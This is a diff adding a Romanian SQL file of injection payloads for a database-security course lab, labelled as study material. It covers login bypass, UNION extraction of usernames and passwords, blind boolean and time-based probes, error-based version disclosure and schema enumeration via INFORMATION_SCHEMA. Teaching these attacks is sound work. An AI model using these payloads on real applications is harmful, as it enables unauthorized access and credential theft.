@@ -1,0 +1,91 @@
+-- ATENȚIE: acestea NU sunt scripturi de rulat. Sunt interogările și payload-urile de SQL injection
+-- analizate în secțiunea 10.6, păstrate pentru studiu. Folosiți-le numai pe laboratorul local
+-- (aplicatia-1-sql-injection), niciodată asupra unor sisteme pe care nu le administrați.
+
+-- ==== 10-securitatea-bazelor-de-date.md:851–852 ====
+SELECT COUNT(*) FROM Utilizatori
+WHERE Username = 'admin' AND Parola = 'parola123'
+
+-- ==== 10-securitatea-bazelor-de-date.md:858–859 ====
+SELECT COUNT(*) FROM Utilizatori
+WHERE Username = 'admin' --' AND Parola = 'orice'
+
+-- ==== 10-securitatea-bazelor-de-date.md:865–865 ====
+SELECT COUNT(*) FROM Utilizatori WHERE Username = 'admin'
+
+-- ==== 10-securitatea-bazelor-de-date.md:877–884 ====
+-- Input malițios în câmpul de căutare a produselor:
+' UNION SELECT NULL, Username + ':' + Parola, NULL, NULL FROM Utilizatori --
+
+-- Interogarea rezultantă:
+SELECT Denumire, Descriere, Pret, Stoc
+FROM Produse
+WHERE Denumire LIKE '%' UNION SELECT NULL, Username + ':' + Parola, NULL, NULL
+FROM Utilizatori --%'
+
+-- ==== 10-securitatea-bazelor-de-date.md:892–898 ====
+-- Atacatorul testează dacă prima literă a parolei admin-ului este 'a'
+' OR (SELECT SUBSTRING(Parola, 1, 1) FROM Utilizatori
+      WHERE Username = 'admin') = 'a' --
+
+-- Dacă pagina se încarcă normal → prima literă este 'a'
+-- Dacă pagina afișează eroare → prima literă NU este 'a'
+-- Atacatorul repetă pentru fiecare literă, fiecare poziție
+
+-- ==== 10-securitatea-bazelor-de-date.md:906–913 ====
+-- Sintaxă T-SQL (SQL Server): interogare „stivuită”, cu WAITFOR ca instrucțiune.
+-- Dacă prima literă a parolei admin-ului este 'a', serverul așteaptă 5 secunde.
+'; IF (SELECT SUBSTRING(Parola, 1, 1) FROM Utilizatori
+       WHERE Username = 'admin') = 'a' WAITFOR DELAY '0:0:5' --
+
+-- Atacatorul măsoară timpul de răspuns:
+-- ~5 secunde → litera este 'a'
+-- răspuns rapid → litera NU este 'a'
+
+-- ==== 10-securitatea-bazelor-de-date.md:921–925 ====
+-- Forțarea unei erori care dezvăluie versiunea SQL Server
+' AND 1=CONVERT(int, @@version) --
+
+-- Eroare: Conversion failed when converting the nvarchar value
+-- 'Microsoft SQL Server 2025 (RTM) - 17.0.900.x ...' to data type int.
+
+-- ==== 10-securitatea-bazelor-de-date.md:937–938 ====
+UPDATE Utilizatori SET Parola = 'parolaNoua'
+WHERE Username = 'admin'--'
+
+-- ==== 10-securitatea-bazelor-de-date.md:1268–1274 ====
+-- Autentificare ca primul utilizator din baza de date
+' OR 1=1 --
+-- Interogarea: SELECT * FROM Users WHERE Username='' OR 1=1 --'
+
+-- Autentificare ca un anumit utilizator, fără parolă
+admin'--
+-- Comentariul -- elimină restul interogării (verificarea parolei)
+
+-- ==== 10-securitatea-bazelor-de-date.md:1284–1309 ====
+-- Pas 1: numărul de coloane (ORDER BY progresiv)
+' ORDER BY 1 --   (funcționează)
+' ORDER BY 2 --   (funcționează)
+' ORDER BY 3 --   (funcționează)
+' ORDER BY 4 --   (eroare → interogarea are 3 coloane)
+
+-- Pas 2: coloanele vizibile și compatibile cu text. NULL este compatibil
+-- cu orice tip, deci se pornește de la NULL-uri și se pune pe rând un șir
+-- pe fiecare poziție. Pe coloana numerică (a 3-a), un șir dă eroare de
+-- conversie, deci acolo se lasă NULL.
+' UNION SELECT 'aaa', 'bbb', NULL --
+-- Atacatorul vede care dintre 'aaa' și 'bbb' apare pe pagină
+
+-- Pas 3: numele tabelelor (pe coloane de tip text, restul NULL)
+' UNION SELECT TABLE_NAME, NULL, NULL
+  FROM INFORMATION_SCHEMA.TABLES --
+
+-- Pas 4: coloanele dintr-un tabel
+' UNION SELECT COLUMN_NAME, DATA_TYPE, NULL
+  FROM INFORMATION_SCHEMA.COLUMNS
+  WHERE TABLE_NAME = 'Utilizatori' --
+
+-- Pas 5: extragerea datelor. Username și Parola (ambele text) se
+-- concatenează pe o singură coloană text; poziția numerică rămâne NULL.
+' UNION SELECT Username + ':' + Parola, NULL, NULL
+  FROM Utilizatori --
